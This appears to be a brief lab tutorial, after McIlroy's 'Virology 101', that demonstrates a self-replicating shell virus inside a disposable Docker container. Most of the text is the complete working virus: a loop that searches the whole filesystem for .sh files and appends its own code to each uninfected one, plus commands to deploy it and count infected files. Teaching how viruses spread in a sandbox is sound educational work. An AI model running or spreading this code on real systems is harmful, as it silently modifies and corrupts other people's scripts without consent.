# Shell virus

Start a lab container that will autodestroy upon exit:

```
docker run --rm -it ubuntu /bin/bash
```

Count the virus population inside the cointainer:

```
find / -type f -iname '*.sh' | xargs grep -l '#virus#' | wc -l
```

Deploy and run the virus inside the container:

```sh
cat << 'EOF' > virus
for i in $(find / -type f -iname '*.sh') #virus#
do
    echo "infecting $i ..."
    grep '#virus#' $i >/dev/null ||
    sed -n '/#virus#/,$p' $0 >>$i
done 2>/dev//null
EOF
chmod u+x virus
./virus
```

Count the virus population inside the cointainer again (see above).

Based on McIlroy's [Virology 101](https://www.cs.princeton.edu/courses/archive/spr09/cos333/virology101.pdf).